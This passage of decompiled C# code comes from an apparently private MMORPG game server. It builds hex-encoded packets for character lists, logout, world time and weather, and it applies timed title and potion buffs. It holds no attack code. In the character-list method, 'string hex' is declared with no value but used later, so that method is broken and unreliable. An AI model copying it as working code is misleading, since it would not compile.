					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(get物品ID + 1), 0, 装备栏已穿装备[3].物品_byte, 8, 4);
					Buffer.BlockCopy(bytes, 0, 装备栏已穿装备[3].物品_byte, 0, 8);
					计算人物装备数据();
					更新HP_MP_SP();
					更新金钱和负重();
					更新武功和状态();
					更新装备效果();
				}
			}
			初始化已装备物品();
		}

		public void 检查人物是否存在(byte[] 封包数据, int 封包大小)
		{
			try
			{
				string hex = "AA5522000000390014000100000000000000000000000000000000000000000000000000000055AA";
				byte[] array = Converter.hexStringToByte("AA5522000000390014000000000000000000000000000000000000000000000000000000000055AA");
				byte[] array2 = Converter.hexStringToByte(hex);
				byte[] array3 = new byte[14];
				Buffer.BlockCopy(封包数据, 10, array3, 0, 14);
				string text = Encoding.Default.GetString(array3).Replace("\0", string.Empty).Trim();
				byte[] bytes = Encoding.Default.GetBytes(text);
				Buffer.BlockCopy(bytes, 0, array, 14, bytes.Length);
				Buffer.BlockCopy(bytes, 0, array2, 14, bytes.Length);
				if (text.Length < 2)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
				else if (RxjhClass.GetUserName(text) != 1)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
				else
				{
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array2, array2.Length);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "创建人物检查人物是否存在出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 获取人物列表(byte[] data, int length)
		{
			try
			{
				封包修改(data, length);
				base.UserName = string.Empty;
				allChars = new ConcurrentDictionary<int, string>();
				byte[] src = new byte[World.数据库单个物品大小];
				byte[] array = Converter.hexStringToByte("AA550B00D80311000500FF45859A0455AA");
				string hex
				DataTable dBToDataTable = DBA.GetDBToDataTable("select * from [TBL_XWWL_Char] where FLD_ID=@Userid", new SqlParameter[1] { SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid) });
				if (dBToDataTable != null)
				{
					if (dBToDataTable.Rows.Count == 0)
					{
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
						goto IL_0886;
					}
					if (dBToDataTable.Rows.Count <= 4)
					{
						for (int i = 0; i < dBToDataTable.Rows.Count; i++)
						{
							int key = (int)dBToDataTable.Rows[i]["FLD_INDEX"];
							string text = dBToDataTable.Rows[i]["FLD_NAME"].ToString();
							if (allChars.ContainsKey(key))
							{
								allChars.TryRemove(key, out var _);
							}
							allChars.TryAdd(key, text);
							byte[] array2 = Converter.hexStringToByte(hex);
							Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
							byte[] bytes = Encoding.Default.GetBytes(text);
							byte[] bytes5 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_ZX"]);
							byte[] bytes6 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_LEVEL"]);
							byte[] bytes7 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_JOB_LEVEL"]);
							byte[] bytes8 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_JOB"]);
							byte[] bytes9 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_HP"] / 10);
							byte[] bytes10 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_MP"] / 10);
							BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_SP"]);
							byte[] src2 = (byte[])dBToDataTable.Rows[i]["FLD_WEARITEM"];
							人物模板类 人物模板类2 = new 人物模板类((byte[])dBToDataTable.Rows[i]["FLD_FACE"]);
							byte[] bytes11 = BitConverter.GetBytes(float.Parse(dBToDataTable.Rows[i]["FLD_X"].ToString()));
							byte[] bytes12 = BitConverter.GetBytes(float.Parse(dBToDataTable.Rows[i]["FLD_Y"].ToString()));
							byte[] bytes2 = BitConverter.GetBytes(float.Parse(dBToDataTable.Rows[i]["FLD_Z"].ToString()));
							byte[] bytes3 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_MENOW"]);
							Buffer.BlockCopy(bytes11, 0, array2, 71, 4);
							byte[] dst = array2;
							Buffer.BlockCopy(bytes2, 0, dst, 75, 4);
							byte[] dst2 = array2;
							Buffer.BlockCopy(bytes12, 0, dst2, 79, 4);
							Buffer.BlockCopy(bytes3, 0, array2, 83, 2);
							DataTable userNameBp = RxjhClass.GetUserNameBp(text);
							if (userNameBp != null)
							{
								Buffer.BlockCopy(BitConverter.GetBytes((int)userNameBp.Rows[0]["门服字"]), 0, array2, 87, 1);
								Buffer.BlockCopy(BitConverter.GetBytes((int)userNameBp.Rows[0]["门服颜色"]), 0, array2, 89, 2);
								userNameBp.Dispose();
							}
							byte[] bytes4 = BitConverter.GetBytes((int)dBToDataTable.Rows[i]["FLD_JQ"]);
							Buffer.BlockCopy(bytes4, 0, array2, 2839, bytes4.Length);
							array2[10] = byte.Parse(key.ToString());
							Buffer.BlockCopy(bytes, 0, array2, 11, bytes.Length);
							Buffer.BlockCopy(bytes5, 0, array2, 49, 2);
							Buffer.BlockCopy(bytes6, 0, array2, 51, 2);
							Buffer.BlockCopy(bytes7, 0, array2, 53, 2);
							Buffer.BlockCopy(bytes8, 0, array2, 55, 1);
							Buffer.BlockCopy(BitConverter.GetBytes((int)人物模板类2.发色), 0, array2, 57, 2);
							Buffer.BlockCopy(BitConverter.GetBytes((int)人物模板类2.发型), 0, array2, 59, 2);
							Buffer.BlockCopy(BitConverter.GetBytes((int)人物模板类2.脸型), 0, array2, 61, 2);
							Buffer.BlockCopy(BitConverter.GetBytes((int)人物模板类2.声音), 0, array2, 63, 1);
							Buffer.BlockCopy(BitConverter.GetBytes((int)人物模板类2.性别), 0, array2, 70, 1);
							Buffer.BlockCopy(bytes9, 0, array2, 151, 2);
							byte[] dst3 = array2;
							Buffer.BlockCopy(bytes10, 0, dst3, 153, 2);
							int num = (int)dBToDataTable.Rows[i]["FLD_ZBVER"];
							int num2 = 203;
							int num3 = BitConverter.ToInt32(bytes8, 0);
							if ((num3 == 12 && 人物模板类2.性别 != 1) || (num3 == 13 && 人物模板类2.性别 != 2))
							{
								base.Client.Dispose();
								封号(720, base.Userid, "创建男神女女卢风郎");
							}
							for (int j = 0; j < 15; j++)
							{
								if (j >= 15)
								{
									Buffer.BlockCopy(src, 0, array2, num2 + j * World.发包单个物品大小, 72);
									continue;
								}
								try
								{
									byte[] array3 = new byte[12];
									Buffer.BlockCopy(src2, j * 73, array3, 0, 12);
									int num4 = BitConverter.ToInt32(array3, 8);
									if (num4 != 0)
									{
										if (j == 11)
										{
											if (World.Itme[num4].FLD_SERIES == 1)
											{
												num4 = int.Parse(num4.ToString().Remove(7) + "0");
												for (int k = 0; k < 7; k++)
												{
													if (World.Itme.TryGetValue(num4, out var value2) && value2.FLD_SERIES == 2)
													{
														num4 = value2.FLD_PID;
														break;
													}
													num4++;
												}
												if (num4 >= 16900830 && num4 <= 16900836)
												{
													num4 = 16900832;
												}
											}
										}
										else if (World.Itme[num4].FLD_INTEGRATION == 1)
										{
											num4 -= 5000;
										}
										Buffer.BlockCopy(BitConverter.GetBytes(num4), 0, array3, 8, 4);
									}
									Buffer.BlockCopy(array3, 0, array2, num2 + j * World.发包单个物品大小, 12);
									Buffer.BlockCopy(src2, j * 73 + 12, array2, num2 + j * World.发包单个物品大小 + 16, 60);
								}
								catch
								{
									Buffer.BlockCopy(src, 0, array2, num2 + j * World.发包单个物品大小, 72);
								}
							}
							if (base.Client != null)
							{
								base.Client.Send(array2, array2.Length);
							}
						}
						goto IL_0886;
					}
					MainForm.WriteLine(1, "人物列表出错，人物数量太多[" + base.Userid + "][" + base.UserName + "] 人物全服ID=[" + base.人物全服ID + "] [" + base.Client.ToString() + "] 数[" + dBToDataTable.Rows.Count + "]");
					dBToDataTable.Dispose();
					base.Client.Dispose();
				}
				else
				{
					base.Client.Send(array, array.Length);
				}
				goto end_IL_0001;
				IL_0886:
				dBToDataTable.Dispose();
				end_IL_0001:;
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "获取人物列表出错[" + base.Userid + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 退回到人物列表(byte[] 封包数据, int 封包大小)
		{
			人物是否登陆 = false;
			退出中 = true;
			Logout();
			string hex = "AA5516000C03630008000100000000000001000000000000000055AA";
			byte[] array = Converter.hexStringToByte("AA5512000C035700040004000000000000000000000055AA");
			byte[] array2 = Converter.hexStringToByte(hex);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 退出(byte[] data, int length)
		{
			封包修改(data, length);
			人物是否登陆 = false;
			退出中 = true;
			Logout();
			string hex = "AA553000450304002A0001000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			byte[] array2 = new byte[base.Userid.Length];
			array2 = Encoding.Default.GetBytes(base.Userid);
			Buffer.BlockCopy(array2, 0, array, 32, array2.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Dispose();
			}
		}

		public void 显示()
		{
			byte[] array = Converter.hexStringToByte("AA550600B2012000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 服务器时间()
		{
			if (World.天气系统开关 != 0)
			{
				if (DateTime.Now.Hour == 0)
				{
					World.世界时间 = 15500;
				}
				if (DateTime.Now.Hour == 1)
				{
					World.世界时间 = 16000;
				}
				if (DateTime.Now.Hour >= 2 && DateTime.Now.Hour <= 4)
				{
					World.世界时间 = 16500;
				}
				else if (DateTime.Now.Hour == 5)
				{
					World.世界时间 = 17000;
				}
				else if (DateTime.Now.Hour == 6)
				{
					World.世界时间 = 18000;
				}
				else if (DateTime.Now.Hour == 7)
				{
					World.世界时间 = 19000;
				}
				else if (DateTime.Now.Hour == 8)
				{
					World.世界时间 = 1000;
				}
				else if (DateTime.Now.Hour == 9)
				{
					World.世界时间 = 3000;
				}
				else if (DateTime.Now.Hour == 10)
				{
					World.世界时间 = 5000;
				}
				else if (DateTime.Now.Hour == 11)
				{
					World.世界时间 = 7000;
				}
				else if (DateTime.Now.Hour == 12)
				{
					World.世界时间 = 8000;
				}
				else if (DateTime.Now.Hour == 13)
				{
					World.世界时间 = 9000;
				}
				else if (DateTime.Now.Hour == 14)
				{
					World.世界时间 = 10000;
				}
				else if (DateTime.Now.Hour == 15)
				{
					World.世界时间 = 11000;
				}
				else if (DateTime.Now.Hour == 16)
				{
					World.世界时间 = 11500;
				}
				else if (DateTime.Now.Hour == 17)
				{
					World.世界时间 = 12000;
				}
				else if (DateTime.Now.Hour == 18)
				{
					World.世界时间 = 12500;
				}
				else if (DateTime.Now.Hour == 19)
				{
					World.世界时间 = 13000;
				}
				else if (DateTime.Now.Hour == 20)
				{
					World.世界时间 = 13500;
				}
				else if (DateTime.Now.Hour == 21)
				{
					World.世界时间 = 14000;
				}
				else if (DateTime.Now.Hour == 22)
				{
					World.世界时间 = 14500;
				}
				else if (DateTime.Now.Hour == 23)
				{
					World.世界时间 = 15000;
				}
				World.世界时间++;
			}
			else
			{
				World.世界时间 = 0;
			}
			int 世界时间 = World.世界时间;
			string hex = "AA550A00000080000400D007000055AA";
			string hex2 = "AA550A00000080000400D107000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			byte[] array2 = Converter.hexStringToByte(hex2);
			if (World.开启下雪场景 == 1)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 13, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array2, 13, 1);
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 13, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array2, 13, 1);
			}
			Buffer.BlockCopy(BitConverter.GetBytes(世界时间), 0, array, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(世界时间++), 0, array2, 10, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 更新服务器时间和场景()
		{
			int 世界时间 = World.世界时间;
			string hex = "AA550A00000080000400D007000055AA";
			string hex2 = "AA550A00000080000400D107000055AA";
			byte[] array = Converter.hexStringToByte(hex);
			byte[] array2 = Converter.hexStringToByte(hex2);
			if (World.开启下雪场景 == 1)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 13, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array2, 13, 1);
			}
			else
			{
				Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 13, 1);
				Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array2, 13, 1);
			}
			Buffer.BlockCopy(BitConverter.GetBytes(世界时间), 0, array, 10, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(世界时间++), 0, array2, 10, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 检测走跑()
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(1);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 1536, base.人物全服ID);
			}
		}

		public void 灵兽数()
		{
			try
			{
				发送灵兽数据_按玩家名称(base.UserName);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "灵兽数()出错[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 未知功能1()
		{
			byte[] array = Converter.hexStringToByte("AA55BE000F276600B800180100000000000000000000000000000000000000000000533120536574546972626542794D617020204465627567506F735B335D204D61705B313230315D20205472696265547970655B305D2054726962655B315D20205472696265556E6368616E67654D61705B2D315D0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 未知功能3()
		{
			byte[] array = Converter.hexStringToByte("AA550600B6057801000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 未知功能4()
		{
			byte[] array = Converter.hexStringToByte("AA554E00B6054B104800000F0000000000000000000000000000000200031C980A00A0BB0D00000000000000000000000000323031393131323431360020202020203230313931313235313000202020202055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 未知功能5()
		{
			byte[] array = Converter.hexStringToByte("AA55BE000F276600B8000800300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006900008914000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 未知功能6()
		{
			byte[] array = Converter.hexStringToByte("AA550800B60515020200010055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 未知功能2()
		{
			byte[] array = Converter.hexStringToByte("AA55BE000F276600B8001801000000000000000000000000000000000000000000001C53657444656661756C745472696265556E6368616E67654D61702829000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 发送在线时长消息(int num)
		{
			byte[] array = Converter.hexStringToByte("AA5516004305002108000000000000000100000000000000C49655AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 药品新效果(int 物品id, int 开关, uint 开始时间, uint 结束时间)
		{
			try
			{
				uint value = 0u;
				using 发包类 发包类 = new 发包类();
				发包类.Write4(0);
				发包类.Write4(0);
				发包类.Write4(物品id);
				发包类.Write4(0);
				发包类.Write2(0);
				发包类.Write2(1);
				if (开关 != 0)
				{
					value = Convert.ToUInt32(DateTime.ParseExact(开始时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture).AddMinutes(0L - (long)结束时间).ToString("yyMMddHHmm"));
				}
				if (开关 != 0)
				{
					发包类.Write4(开始时间);
				}
				else
				{
					发包类.Write4(0);
				}
				发包类.Write4(0);
				发包类.Write2(开关);
				发包类.Write2(0);
				if (开关 != 0)
				{
					发包类.Write4(value);
				}
				else
				{
					发包类.Write4(0);
				}
				发包类.Write4(0);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 17153, base.人物全服ID);
				}
			}
			catch
			{
			}
		}

		public void 特殊物品结束()
		{
			try
			{
				List<特殊药品类> list = new List<特殊药品类>();
				foreach (特殊药品类 value2 in 特殊药品.Values)
				{
					if ((DateTime.ParseExact(value2.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now).TotalMinutes <= 0.0 && 特殊药品.ContainsKey(value2.药品ID))
					{
						list.Add(value2);
					}
				}
				foreach (特殊药品类 item in list)
				{
					特殊药品.TryRemove(item.药品ID, out var _);
					药品新效果(item.药品ID, 0, 0u, 0u);
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "时间物品结束![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 时间物品结束()
		{
			try
			{
				List<时间药品类> list = new List<时间药品类>();
				foreach (时间药品类 value2 in 时间药品.Values)
				{
					if ((DateTime.ParseExact(value2.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now).TotalMinutes <= 0.0 && 时间药品.ContainsKey(value2.药品ID))
					{
						list.Add(value2);
					}
				}
				foreach (时间药品类 item in list)
				{
					时间药品.TryRemove(item.药品ID, out var _);
					药品新效果(item.药品ID, 0, 0u, 0u);
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "时间物品结束![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 称号物品结束()
		{
			try
			{
				List<称号药品类> list = new List<称号药品类>();
				foreach (称号药品类 value2 in 称号药品.Values)
				{
					if (称号药品.ContainsKey(value2.药品ID))
					{
						if ((DateTime.ParseExact(value2.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now).TotalMinutes <= 0.0 && 时间药品.ContainsKey(value2.药品ID))
						{
							list.Add(value2);
						}
						continue;
					}
					return;
				}
				foreach (称号药品类 item in list)
				{
					称号药品.TryRemove(item.药品ID, out var _);
					药品新效果(item.药品ID, 0, 0u, 0u);
					更新武功和状态();
					更新人物数据(this);
					更新广播人物数据();
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "称号物品结束![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void set称号物品()
		{
			ConcurrentDictionary<int, 称号药品类> concurrentDictionary = new ConcurrentDictionary<int, 称号药品类>();
			foreach (称号药品类 value2 in 称号药品.Values)
			{
				if (value2.时间 > uint.Parse(DateTime.Now.ToString("yyMMddHHmm")))
				{
					Set武勋物品(value2);
				}
				else
				{
					concurrentDictionary.TryAdd(value2.药品ID, value2);
				}
			}
			foreach (称号药品类 value3 in concurrentDictionary.Values)
			{
				称号药品.TryRemove(value3.药品ID, out var _);
			}
		}

		public void Set武勋物品(称号药品类 药品)
		{
			try
			{
				switch (药品.药品ID)
				{
				case 1008001043:
				{
					DateTime d6 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now6 = DateTime.Now;
					药品新效果(1008001043, 1, 药品.时间, (uint)(d6 - now6).TotalMinutes);
					break;
				}
				case 1008001042:
				{
					DateTime d5 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now5 = DateTime.Now;
					药品新效果(1008001042, 1, 药品.时间, (uint)(d5 - now5).TotalMinutes);
					break;
				}
				case 1008001479:
				{
					DateTime d4 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now4 = DateTime.Now;
					TimeSpan timeSpan2 = d4 - now4;
					药品追加对怪攻击 = 150;
					药品追加对怪防御 = 200;
					FLD_药品_追加_气功 = 2;
					药品新效果(1008001479, 1, 药品.时间, (uint)timeSpan2.TotalMinutes);
					break;
				}
				case 1008001478:
				{
					DateTime d3 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now3 = DateTime.Now;
					TimeSpan timeSpan = d3 - now3;
					药品追加对怪攻击 = 150;
					药品追加对怪防御 = 200;
					FLD_药品_追加_气功 = 2;
					药品新效果(1008001478, 1, 药品.时间, (uint)timeSpan.TotalMinutes);
					break;
				}
				case 1008002377:
				{
					DateTime d2 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now2 = DateTime.Now;
					药品新效果(1008002377, 1, 药品.时间, (uint)(d2 - now2).TotalMinutes);
					break;
				}
				case 1008002376:
				{
					DateTime d = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now = DateTime.Now;
					药品新效果(1008002376, 1, 药品.时间, (uint)(d - now).TotalMinutes);
					break;
				}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "set武勋物品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 激活斗神称号(byte[] data, int length)
		{
			封包修改(data, length);
			try
			{
				if (称号药品.ContainsKey(1008001479) || 称号药品.ContainsKey(1008001478) || data[10] != 90)
				{
					return;
				}
				switch (World.斗神称号激活方式)
				{
				default:
					Config.武勋开关 = 0;
					系统提示("未开启面板激活斗神称号功能，请联系游戏管理员。");
					return;
				case 1:
					if (base.Player_ExpErience < World.斗神称号需要数量)
					{
						Config.武勋开关 = 0;
						系统提示("激活斗神称号失败, 当前历练值小于" + World.斗神称号需要数量);
						return;
					}
					base.Player_ExpErience -= World.斗神称号需要数量;
					break;
				case 2:
					if (base.Player_WuXun < World.斗神称号需要数量)
					{
						Config.武勋开关 = 0;
						系统提示("激活斗神称号失败, 当前武勋值小于" + World.斗神称号需要数量);
						return;
					}
					base.Player_WuXun -= World.斗神称号需要数量;
					break;
				case 3:
					if (base.Player_Money < World.斗神称号需要数量)
					{
						Config.武勋开关 = 0;
						系统提示("激活斗神称号失败, 当前游戏币小于" + World.斗神称号需要数量);
						return;
					}
					base.Player_Money -= World.斗神称号需要数量;
					break;
				}
				Config.武勋开关 = 90;
				DateTime d = DateTime.Now.AddDays(30.0);
				DateTime now = DateTime.Now;
				uint 时间 = Convert.ToUInt32(d.ToString("yyMMddHHmm"));
				TimeSpan timeSpan = d - now;
				称号药品类 称号药品类2 = new 称号药品类
				{
					药品ID = 1008001479,
					时间 = 时间
				};
				称号药品.TryAdd(称号药品类2.药品ID, 称号药品类2);
				药品新效果(1008001479, 1, 称号药品类2.时间, (uint)timeSpan.TotalMinutes);
				药品追加对怪攻击 = 150;
				药品追加对怪防御 = 200;
				FLD_药品_追加_气功 = 2;
				Config.武勋开关 = 90;
				更新经验和历练();
				RxjhClass.药品记录(base.Userid, base.UserName, 1008001479, "激活斗神称号", 1);
				更新人物数据(this);
				更新武功和状态();
				更新广播人物数据();
				更新装备效果();
				foreach (Players value in World.AllConnectedPlayers.Values)
				{
					value.新系统提示(1, 4990, base.UserName, "");
				}
			}
			catch
			{
			}
		}

		public void 换线更新配置(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			PacketReader packetReader = new PacketReader(封包数据, 封包大小, fixedSize: false);
			packetReader.Seek(10, SeekOrigin.Begin);
			if (封包大小 != 26)
			{
				系统提示("本江湖使用21.0版本，请下载最新客户端，否则有个别功能无法使用", 9, "系统提示");
			}
			Config.组队 = packetReader.ReadInt8();
			Config.交易 = packetReader.ReadInt8();
			Config.传音 = packetReader.ReadInt8();
			packetReader.ReadInt8();
			int 原著衣服 = Config.原著衣服;
			Config.原著衣服 = packetReader.ReadInt8();
			Config.查装备 = packetReader.ReadInt8();
			int 头发开关 = Config.头发开关;
			Config.头发开关 = packetReader.ReadInt8();
			int 武勋开关 = Config.武勋开关;
			Config.武勋开关 = packetReader.ReadInt8();
			if (Config.武勋开关 == 2 && (double)base.Player_WuXun > World.Wxlever[8].武勋点 + 50000.0 && base.Player_WuXun >= 1500000 && base.武勋阶段 == 7 && base.Player_Zx != 0)
			{
				DateTime d = DateTime.Now.AddDays(30.0);
				DateTime now = DateTime.Now;
				double num = Convert.ToDouble(d.ToString("yyMMddHHmm"));
				TimeSpan timeSpan = d - now;
				称号药品类 称号药品类2 = new 称号药品类
				{
					时间 = (uint)num
				};
				base.Player_WuXun -= 50000;
				if (base.Player_Zx == 1)
				{
					称号药品类2.药品ID = 1008001042;
					药品新效果(1008001042, 1, 称号药品类2.时间, (uint)timeSpan.TotalMinutes);
				}
				else
				{
					称号药品类2.药品ID = 1008001043;
					药品新效果(1008001043, 1, 称号药品类2.时间, (uint)timeSpan.TotalMinutes);
				}
				称号药品.TryAdd(称号药品类2.药品ID, 称号药品类2);
				World.发送全服武勋称号获得消息(base.UserName, base.Player_Zx);
			}
			Config.搜索开关 = packetReader.ReadInt8();
			Config.告白开关 = packetReader.ReadInt8();
			int 蔬菜武器开关 = Config.蔬菜武器开关;
			Config.蔬菜武器开关 = packetReader.ReadInt8();
			packetReader.ReadInt8();
			Config.宠物经验 = packetReader.ReadInt8();
			更新人物数据(this);
			更新装备效果to(this, this);
			if (原著衣服 != Config.原著衣服 || 蔬菜武器开关 != Config.蔬菜武器开关 || 头发开关 != Config.头发开关 || 武勋开关 != Config.武勋开关)
			{
				更新武功和状态();
				更新广播人物数据();
				更新装备效果();
			}
			服务器时间();
			客户端设置 = Converter.ToString(封包数据);
		}

		public void 更新配置(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			PacketReader packetReader = new PacketReader(封包数据, 封包大小, fixedSize: false);
			packetReader.Seek(10, SeekOrigin.Begin);
			if (封包大小 != 26)
			{
				系统提示("本江湖使用21.0版本，请下载最新客户端，否则有个别功能无法使用", 9, "系统提示");
			}
			Config.组队 = packetReader.ReadInt8();
			Config.交易 = packetReader.ReadInt8();
			Config.传音 = packetReader.ReadInt8();
			packetReader.ReadInt8();
			int 原著衣服 = Config.原著衣服;
			Config.原著衣服 = packetReader.ReadInt8();
			Config.查装备 = packetReader.ReadInt8();
			int 头发开关 = Config.头发开关;
			Config.头发开关 = packetReader.ReadInt8();
			int 武勋开关 = Config.武勋开关;
			Config.武勋开关 = packetReader.ReadInt8();
			if (Config.武勋开关 == 2 && (double)base.Player_WuXun > World.Wxlever[8].武勋点 + 50000.0 && base.Player_WuXun >= 1550000 && base.武勋阶段 == 7 && base.Player_Zx != 0)
			{
				DateTime d = DateTime.Now.AddDays(30.0);
				DateTime now = DateTime.Now;
				double num = Convert.ToDouble(d.ToString("yyMMddHHmm"));
				TimeSpan timeSpan = d - now;
				称号药品类 称号药品类2 = new 称号药品类
				{
					时间 = (uint)num
				};
				base.Player_WuXun -= 50000;
				if (base.Player_Zx == 1)
				{
					称号药品类2.药品ID = 1008001042;
					药品新效果(1008001042, 1, 称号药品类2.时间, (uint)timeSpan.TotalMinutes);
				}
				else
				{
					称号药品类2.药品ID = 1008001043;
					药品新效果(1008001043, 1, 称号药品类2.时间, (uint)timeSpan.TotalMinutes);
				}
				称号药品.TryAdd(称号药品类2.药品ID, 称号药品类2);
				World.发送全服武勋称号获得消息(base.UserName, base.Player_Zx);
			}
			else if (Config.武勋开关 == 3 && (double)base.Player_WuXun > World.Wxlever[9].武勋点 + 150000.0 && base.Player_WuXun >= 5150000 && base.武勋阶段 == 7 && base.Player_Zx != 0)
			{
				DateTime d2 = DateTime.Now.AddDays(30.0);
				DateTime now2 = DateTime.Now;
				double num2 = Convert.ToDouble(d2.ToString("yyMMddHHmm"));
				TimeSpan timeSpan2 = d2 - now2;
				称号药品类 称号药品类3 = new 称号药品类
				{
					时间 = (uint)num2
				};
				base.Player_WuXun -= 150000;
				if (base.Player_Zx == 1)
				{
